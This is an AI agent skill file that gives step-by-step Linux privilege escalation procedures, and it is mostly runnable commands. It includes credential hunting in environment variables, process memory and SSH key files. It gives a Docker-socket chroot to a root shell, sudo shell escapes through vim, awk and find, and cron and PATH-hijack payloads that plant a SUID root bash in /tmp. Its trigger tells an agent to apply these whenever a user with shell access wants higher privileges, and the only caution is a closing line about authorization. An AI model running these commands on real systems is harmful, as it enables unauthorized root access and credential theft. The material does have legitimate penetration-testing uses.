---
name: linux-privilege-escalation
description: Use this skill whenever you need to enumerate and exploit Linux privilege escalation vectors. Trigger this skill when the user mentions privilege escalation, privesc, gaining root, escalating privileges, Linux security assessment, or when they have shell access to a Linux system and want to find ways to gain higher privileges. This skill covers system enumeration, SUID binaries, sudo misconfigurations, cron jobs, kernel exploits, container escapes, and more.
---

# Linux Privilege Escalation Skill

A comprehensive guide for enumerating and exploiting privilege escalation vectors on Linux systems.

## When to Use This Skill

Use this skill when:
- You have shell access to a Linux system and want to escalate privileges
- You're performing a security assessment or penetration test
- You need to enumerate system information for privilege escalation opportunities
- You want to check for specific vulnerability classes (SUID, sudo, cron, etc.)
- You're documenting or learning about Linux privilege escalation techniques

## Quick Start

```bash
# Run the comprehensive enumeration script
./scripts/linux-pe-enumerate.sh

# Check for specific vulnerability classes
./scripts/check-suid.sh
./scripts/check-sudo.sh
./scripts/check-cron.sh
```

## System Enumeration

### OS and Kernel Information

```bash
# Get OS version
(cat /proc/version || uname -a) 2>/dev/null
cat /etc/os-release 2>/dev/null

# Check kernel version for known exploits
uname -r
searchsploit "Linux Kernel $(uname -r)"
```

### Environment Variables

```bash
# Check PATH for writable directories
echo $PATH

# Look for credentials in environment
(env || set) 2>/dev/null | grep -iE 'password|api|key|token|secret'
```

### User and Group Information

```bash
# Current user privileges
id

# List all users
cat /etc/passwd | cut -d: -f1

# Find users with shell access
cat /etc/passwd | grep "sh$"

# Find superusers (UID 0)
awk -F: '($3 == "0") {print}' /etc/passwd

# Check group memberships
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null); do id $i; done 2>/dev/null | sort
```

## Privilege Escalation Vectors

### SUID Binaries

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find SUID binaries in non-standard locations
find / -perm -4000 -type f ! -path "/usr/*" ! -path "/bin/*" ! -path "/sbin/*" 2>/dev/null

# Check for writable SUID binaries
find / -perm -4000 -type f -writable 2>/dev/null
```

### Sudo Misconfigurations

```bash
# Check sudo permissions
sudo -l

# Check for NOPASSWD entries
sudo -l | grep NOPASSWD

# Check for env_keep settings
sudo -l | grep -i env

# Check sudoers files
ls -l /etc/sudoers /etc/sudoers.d/ 2>/dev/null
```

### Cron Jobs

```bash
# List all cron jobs
crontab -l 2>/dev/null
ls -al /etc/cron* /etc/at* 2>/dev/null

# Check for writable cron scripts
cat /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/* 2>/dev/null | grep -v "^#"

# Find cron jobs with wildcards (potential injection)
grep -r '\*' /etc/cron* /var/spool/cron/ 2>/dev/null
```

### Writable Files and Directories

```bash
# Find files owned by current user or world-writable
find / \( -type f -o -type d \) \( -user $USER -o -perm -o=w \) ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null

# Find files writable by user's groups
for g in $(groups | cut -d: -f2 | tr ' ' '\n'); do
  find / -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null
done

# Check PATH directories for write access
for dir in $(echo $PATH | tr ':' '\n'); do
  if [ -w "$dir" ]; then
    echo "Writable PATH directory: $dir"
  fi
done
```

### Kernel Exploits

```bash
# Check kernel version
uname -r

# Search for kernel exploits
searchsploit "Linux Kernel $(uname -r)"

# Check for known vulnerable kernels
curl -s https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: "

# Use linux-exploit-suggester
# Download: https://github.com/mzet-/linux-exploit-suggester
```

### Docker Privilege Escalation

```bash
# Check if Docker socket is accessible
ls -la /var/run/docker.sock 2>/dev/null

# Check if user is in docker group
groups | grep docker

# Test Docker access
docker -H unix:///var/run/docker.sock ps 2>/dev/null

# If accessible, escalate privileges
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
```

### Process Memory

```bash
# Check ptrace permissions
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null

# List running processes
ps aux
ps -ef

# Check for processes with credentials in memory
# Requires appropriate permissions
strings /proc/<PID>/mem 2>/dev/null | grep -iE 'password|api|key|token'
```

### Interesting Files

```bash
# Find password-related files
find / -type f \( -name "*password*" -o -name "*passwd*" -o -name "*shadow*" \) 2>/dev/null

# Find history files
find / -type f -name "*_history" 2>/dev/null

# Find SSH keys
find / -type f -name "id_rsa*" -o -name "id_dsa*" -o -name "id_ecdsa*" 2>/dev/null

# Find .git-credentials
find / -type f -name ".git-credentials" 2>/dev/null

# Find backup files
find / -type f \( -name "*backup*" -o -name "*.bak" -o -name "*.bck" \) 2>/dev/null
```

### Network Services

```bash
# List listening services
ss -tulpn
netstat -punta 2>/dev/null

# Check for localhost-only services
ss -tulpn | grep "127.0"

# Check for open ports
nmap -Pn --open -p- 127.0.0.1 2>/dev/null

# Check network configuration
ip a
ip route
```

## Common Exploitation Patterns

### SUID Binary Exploitation

If you find a SUID binary that's writable or has a vulnerability:

```bash
# Check what libraries the SUID binary loads
ldd /path/to/suid_binary

# Check for custom library paths
readelf -d /path/to/suid_binary | grep -iE 'RPATH|RUNPATH'

# If writable, replace with malicious version
cp /path/to/suid_binary /tmp/
# Modify and set SUID
chmod +s /tmp/suid_binary
```

### Sudo NOPASSWD Exploitation

If you have NOPASSWD sudo access to a command:

```bash
# Check GTFOBins for the command
# https://gtfobins.github.io/

# Common examples:
sudo vim -c ':!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find / -exec /bin/sh \;
```

### Cron Job Exploitation

If you find a writable cron job:

```bash
# Add payload to cron script
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/cron/script.sh

# Or create a malicious script in PATH
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /writable/path/script.sh

# Wait for cron to execute
```

### PATH Hijacking

If you can write to a directory in PATH:

```bash
# Create malicious binary with same name as commonly used command
cat > /writable/path/python3 <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
/tmp/rootbash -p
EOF
chmod +x /writable/path/python3

# Wait for a process to call python3 without full path
```

## Security Protections to Check

```bash
# Check AppArmor
aa-status 2>/dev/null || apparmor_status 2>/dev/null

# Check SELinux
sestatus 2>/dev/null

# Check ASLR
cat /proc/sys/kernel/randomize_va_space 2>/dev/null

# Check Grsecurity
uname -r | grep -i grsec

# Check PaX
which paxctl-ng paxctl 2>/dev/null
```

## Useful Tools

- **LinPEAS**: Comprehensive privilege escalation enumeration
  - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

- **GTFOBins**: Unix binaries that can be exploited
  - https://gtfobins.github.io/

- **Searchsploit**: Exploit database
  - https://www.exploit-db.com/

- **Linux Exploit Suggester**: Kernel exploit enumeration
  - https://github.com/mzet-/linux-exploit-suggester

## Next Steps

After enumeration:

1. Review the output from `./scripts/linux-pe-enumerate.sh`
2. Check specific vulnerability classes with the check scripts
3. Research found vulnerabilities using Searchsploit or GTFOBins
4. Test exploitation carefully (may require compiling exploits)
5. Document findings and remediation recommendations

## Important Notes

- Always have proper authorization before testing
- Some checks require elevated privileges to be fully effective
- Kernel exploits may crash the system - test in a safe environment
- Document all findings for remediation
- Consider using automated tools like LinPEAS for comprehensive checks
